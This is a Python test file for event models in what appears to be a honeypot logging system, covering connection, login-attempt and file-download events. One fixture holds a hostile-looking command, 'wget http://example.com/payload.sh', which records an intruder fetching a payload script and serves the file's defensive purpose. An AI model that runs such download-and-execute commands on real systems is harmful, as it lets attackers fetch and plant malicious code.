from panopticon.events.models import ConnectionOpen, EventType, FileDownload, LoginAttempt, BaseEvent


def test_connection_open_event_defaults() -> None:
    event = ConnectionOpen(
        session_id="test-session",
        src_ip="127.0.0.1",
        src_port=5555,
    )

    assert event.event_type == EventType.connection_open
    assert event.session_id == "test-session"
    assert event.src_ip == "127.0.0.1"
    assert event.src_port == 5555
    assert event.id is not None
    assert event.timestamp is not None


def test_login_attempt_event() -> None:
    event = LoginAttempt(
        session_id="test-session",
        src_ip="127.0.0.1",
        src_port=5555,
        username="admin",
        password="password",
        success=True,
    )

    assert event.event_type == EventType.login_attempt
    assert event.username == "admin"
    assert event.password == "password"
    assert event.success is True


def test_file_download_event() -> None:
    event = FileDownload(
        session_id="test-session",
        src_ip="127.0.0.1",
        src_port=5555,
        input="wget http://example.com/payload.sh",
        tool="wget",
        url="http://example.com/payload.sh",
        destination=None,
    )

    assert event.event_type == EventType.file_download
    assert event.tool == "wget"
    assert event.url == "http://example.com/payload.sh"
    assert event.destination is None


def test_base_event_validates_json() -> None:
    event = ConnectionOpen(
        session_id="test-session",
        src_ip="127.0.0.1",
        src_port=5555,
    )

    raw_event: str = event.model_dump_json()
    parsed_event: BaseEvent = BaseEvent.model_validate_json(raw_event)

    assert parsed_event.id == event.id
    assert parsed_event.event_type == EventType.connection_open
